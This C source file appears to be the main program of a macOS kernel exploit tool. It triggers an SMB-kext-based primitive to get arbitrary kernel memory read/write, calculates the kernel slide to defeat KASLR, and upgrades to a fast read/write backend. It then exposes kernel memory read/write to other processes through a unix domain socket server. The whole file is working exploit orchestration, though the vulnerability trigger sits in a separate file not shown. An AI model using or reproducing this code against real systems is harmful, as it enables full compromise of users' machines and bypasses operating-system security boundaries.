
#include <stdio.h>
#include <limits.h>
#include <unistd.h>

#include <dispatch/dispatch.h>

#include <sys/resource.h>
#include <arpa/inet.h>

#include <xpl/xpl.h>
#include <xpl/util/log.h>
#include <xpl/util/binary.h>
#include <xpl/util/assert.h>
#include <xpl/util/msdosfs.h>
#include <xpl/memory/kmem.h>
#include <xpl/memory/kmem_fast.h>
#include <xpl/memory/kmem_remote.h>
#include <xpl/slider/kernel.h>

#include <xpl_smbx/smbx_conf.h>

#include "smb/client.h"
#include "smb/params.h"

#include "kmem_bootstrap.h"


int main(int argc, const char* argv[]) {
    xpl_init();
    smb_client_load_kext();
    
    char* socket_path = XPL_DEFAULT_KMEM_SOCKET;
    
    int ch;
    while ((ch = getopt(argc, (char**)argv, "k:")) != -1) {
        switch (ch) {
            case 'k': {
                socket_path = optarg;
                break;
            }
            case '?':
            default: {
                xpl_log_info("usage: xpl_kmem [-k kmem-server-uds]");
                exit(1);
            }
        }
    }
    
    /// Increase open file limit
    struct rlimit nofile_limit;
    int res = getrlimit(RLIMIT_NOFILE, &nofile_limit);
    xpl_assert(res == 0);
    nofile_limit.rlim_cur = nofile_limit.rlim_max;
    res = setrlimit(RLIMIT_NOFILE, &nofile_limit);
    xpl_assert(res == 0);

    /// Base socket address of xpl_smbx server
    struct sockaddr_in smb_addr;
    bzero(&smb_addr, sizeof(smb_addr));
    smb_addr.sin_family = AF_INET;
    smb_addr.sin_len = sizeof(smb_addr);
    smb_addr.sin_port = htons(XPL_SMBX_PORT);
    inet_aton(XPL_SMBX_HOST, &smb_addr.sin_addr);
    
    /// STEP 1: Use `kmem_boostrap.c` to setup slow arbitary kernel memory read / write
    xpl_kmem_backend_t kmem_slow = kmem_bootstrap_create(&smb_addr);
    xpl_kmem_use_backend(kmem_slow);
    
    /// STEP 2: Calculate the kernel address slide
    uintptr_t meh = kmem_bootstrap_get_mh_execute_header(kmem_slow);
    xpl_slider_kernel_init(meh);
    
    /// STEP 3: Use slow kmem backend to setup fast arbitary kernel memory read / write backend
    xpl_kmem_backend_t kmem_fast = xpl_memory_kmem_fast_create();
    xpl_kmem_use_backend(kmem_fast);
    
    /// Slow kernel memory read / write backend is not required anymore
    kmem_bootstrap_destroy(&kmem_slow);
    
    /// Start listening for kernel memory read / write requests from other processes
    /// using a unix domain socket
    int error = xpl_kmem_remote_server_start(meh, socket_path);
    if (error) {
        xpl_log_error("failed to start remote kmem server at socket %s, err: %s", socket_path, strerror(error));
        xpl_memory_kmem_fast_destroy(&kmem_fast);
        exit(1);
    }
    
    xpl_memory_kmem_fast_destroy(&kmem_fast);
    return 0;
}

